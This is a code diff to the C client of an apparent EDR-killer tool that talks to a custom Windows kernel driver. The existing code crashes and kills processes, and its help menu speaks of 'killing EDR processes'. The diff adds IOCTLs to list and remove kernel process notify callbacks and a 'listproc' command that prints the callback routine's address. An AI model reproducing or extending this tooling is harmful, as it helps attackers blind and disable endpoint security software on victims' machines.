@@ -25,7 +25,8 @@ int stop_term_thread = 0;
 
 // Define custom IOCTL to instruct driver to crash target process
 #define IOCTL_CRASH CTL_CODE_HIDE(1)
-
+#define IOCTL_REM_PROC_CALLBACK CTL_CODE_HIDE(2)
+#define IOCTL_LIST_PROC_CALLBACK CTL_CODE_HIDE(3)
 #pragma warning (disable: 4996)
 
 #define _CRT_SECURE_NO_WARNINGS
@@ -167,6 +168,32 @@ void killer_callback(HANDLE hDevice) {
     }
 }
 
+BOOL ListProcNotifyRoutine(HANDLE hDevice) {
+    DWORD bytesReturned;
+	LPVOID outputBuffer = NULL;
+	DWORD outputBufferSize = sizeof(LPVOID);
+    
+    BOOL result = DeviceIoControl(
+        hDevice,
+		IOCTL_LIST_PROC_CALLBACK,
+        NULL,
+        0,
+        &outputBuffer,
+        outputBufferSize,
+        &bytesReturned,
+		NULL
+    );
+    if (result) {
+        printf("Process Notify Routine Address: 0x%p\n", outputBuffer);
+    }
+    else {
+        fprintf(stderr, "Failed to get Process Notify Routine. Error: %lu\n", GetLastError());
+	}
+
+    return result;
+}
+
+
 
 
 int main(int argc, char* argv[])
@@ -207,6 +234,9 @@ int main(int argc, char* argv[])
             printf("Stopping termination...\n");
 			stop_term_thread = 1;            
         }
+		else if (strncmp(input, "listproc", 8) == 0) {
+			ListProcNotifyRoutine(hDevice);
+		}
         else if (strncmp(input, "kill", 4) == 0) {
             DWORD pid = atoi(input + 5);
             if (pid == 0) {
@@ -227,6 +257,7 @@ int main(int argc, char* argv[])
 			printf(" - kill <PID>       - Kill a specific process by PID\n");
 			printf(" - exit             - Exit the program\n");
 			printf(" - stopterm         - Stop killing EDR processes\n");
+			printf(" - listproc         - List process notify routines\n");
 			printf(" - help             - Show this help menu\n");
         }
         else {
